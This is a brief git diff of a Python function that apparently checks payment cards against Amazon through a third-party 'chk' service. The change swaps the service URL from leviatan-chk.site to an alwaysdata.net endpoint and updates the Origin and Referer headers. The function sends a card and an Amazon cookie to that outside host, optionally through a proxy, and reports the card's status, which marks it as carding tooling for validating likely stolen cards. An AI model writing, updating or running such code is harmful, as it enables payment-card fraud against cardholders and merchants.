@@ -35,13 +35,13 @@ def procesar_tarjeta_amazon(card, cookie, use_json=True, proxy_config=None):
         
 
     # --- URL / headers / payload ---
-    url = "https://leviatan-chk.site/amazon/leviatan"
+    url = "https://apis-dpchk.alwaysdata.net/apis/the_crow/Amazon.php"
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
         'Accept': 'application/json, text/plain, */*',
         # Content-Type se ajustará según enviemos json o form
-        'Origin': 'https://leviatan-chk.site',
-        'Referer': 'https://leviatan-chk.site/amazon/leviatan'
+        'Origin': 'https://apis-dpchk.alwaysdata.net/apis/the_crow/Amazon.php',
+        'Referer': 'https://apis-dpchk.alwaysdata.net/apis/the_crow/Amazon.php'
     }
 
     payload = {
@@ -162,3 +162,4 @@ def procesar_tarjeta_amazon(card, cookie, use_json=True, proxy_config=None):
         return {"status": "error", "message": f"❌ HTTPError: {str(he)} - body: {body}", "cc": card}
     except Exception as e:
         return {"status": "error", "message": f"❌ Error al procesar tarjeta: {str(e)}", "cc": card}
+
